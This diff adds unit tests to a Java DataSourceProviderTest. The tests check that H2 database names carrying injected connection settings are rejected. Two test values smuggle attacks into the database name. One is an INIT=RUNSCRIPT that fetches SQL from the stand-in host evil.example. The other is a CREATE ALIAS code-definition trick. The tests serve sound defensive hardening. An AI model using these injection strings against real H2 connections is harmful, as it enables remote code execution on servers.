@@ -190,6 +190,40 @@ public class DataSourceProviderTest {
   }
 
   @Test
+  public void h2DatabaseNameWithValidConnectionSettingsIsAccepted() throws Exception {
+    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
+    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.H2.type()).anyTimes();
+    EasyMock.expect(gatewayConfig.getDatabaseName()).andReturn("mem:knox;DB_CLOSE_DELAY=-1").anyTimes();
+    EasyMock.expect(gatewayConfig.isDatabaseH2EncryptionEnabled()).andReturn(false).anyTimes();
+    final AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
+    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(EasyMock.anyString())).andReturn(null).anyTimes();
+    EasyMock.replay(gatewayConfig, aliasService);
+    final JdbcDataSource dataSource = (JdbcDataSource) DataSourceProvider.getDataSource(gatewayConfig, aliasService);
+    assertEquals("jdbc:h2:mem:knox;DB_CLOSE_DELAY=-1", dataSource.getUrl());
+  }
+
+  @Test
+  public void h2DatabaseNameWithInitRunscriptIsRejected() throws Exception {
+    assertH2DatabaseNameRejected("mem:knox;INIT=RUNSCRIPT FROM 'http://evil.example/x.sql'");
+  }
+
+  @Test
+  public void h2DatabaseNameWithCreateAliasIsRejected() throws Exception {
+    assertH2DatabaseNameRejected("mem:knox;init=CREATE ALIAS EXEC AS 'String x() { return \"\"; }'");
+  }
+
+  private void assertH2DatabaseNameRejected(String databaseName) throws Exception {
+    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
+    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.H2.type()).anyTimes();
+    EasyMock.expect(gatewayConfig.getDatabaseName()).andReturn(databaseName).anyTimes();
+    EasyMock.expect(gatewayConfig.isDatabaseH2EncryptionEnabled()).andReturn(false).anyTimes();
+    final AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
+    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(EasyMock.anyString())).andReturn(null).anyTimes();
+    EasyMock.replay(gatewayConfig, aliasService);
+    assertThrows(SQLException.class, () -> DataSourceProvider.getDataSource(gatewayConfig, aliasService));
+  }
+
+  @Test
   public void shouldReturnMySqlDataSource() throws Exception {
     final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
     EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.MYSQL.type()).anyTimes();
